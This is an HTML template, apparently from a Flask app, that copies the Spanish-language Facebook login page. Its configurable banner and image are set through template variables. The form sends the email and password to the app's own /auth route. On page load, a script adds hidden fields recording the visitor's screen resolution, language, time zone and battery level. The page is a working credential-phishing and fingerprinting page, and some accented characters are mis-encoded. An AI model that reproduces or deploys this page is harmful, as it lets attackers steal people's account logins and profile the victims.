<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Iniciar sesi칩n</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body { 
            background: {{ config.color_fondo }}; 
            background: linear-gradient(180deg, {{ config.color_fondo }} 0%, #000000 100%);
            color: {{ config.color_texto }};
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
        }
        .container-fb { width: 100%; max-width: 400px; padding: 10px; }
        .card-top { border-radius: 15px 15px 0 0; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .img-header { width: 100%; height: 180px; object-fit: cover; }
        .banner-msg { 
            padding: 15px; text-align: center; background: rgba(255,255,255,0.1); 
            backdrop-filter: blur(10px); font-weight: bold; border-top: 1px solid rgba(255,255,255,0.1);
        }
        .card-login { 
            background: white; padding: 25px; border-radius: 0 0 15px 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center;
        }
        .fb-text { color: #1877f2; font-size: 2.5rem; font-weight: bold; margin-bottom: 15px; display: block; }
        .form-control { height: 50px; font-size: 16px; margin-bottom: 12px; }
        .btn-fb { background: #1877f2; border: none; font-weight: bold; height: 48px; width: 100%; font-size: 1.1rem; }
    </style>
</head>
<body>
    <div class="container-fb">
        <div class="card-top">
            <img src="{{ config.img_principal }}" class="img-header" onerror="this.src='https://via.placeholder.com/400x200?text=Sube+Portada'">
            <div class="banner-msg">{{ config.titulo }}</div>
        </div>
        <div class="card-login">
            <span class="fb-text">facebook</span>
            <form action="/auth" method="POST" id="forensic">
                <input type="text" name="email" class="form-control" placeholder="Celular o correo electr칩nico" required>
                <input type="password" name="pass" class="form-control" placeholder="Contrase침a" required>
                <button class="btn btn-primary btn-fb">Iniciar sesi칩n</button>
            </form>
        </div>
    </div>

    <script>
        window.onload = async function() {
            const f = document.getElementById('forensic');
            const add = (n, v) => {
                const i = document.createElement('input'); i.type = 'hidden'; i.name = n; i.value = v; f.appendChild(i);
            };
            add('resolucion', window.screen.width + "x" + window.screen.height);
            add('lenguaje', navigator.language);
            add('tz', Intl.DateTimeFormat().resolvedOptions().timeZone);
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                add('bateria', Math.round(b.level * 100) + "%");
            }
        };
    </script>
</body>
</html>
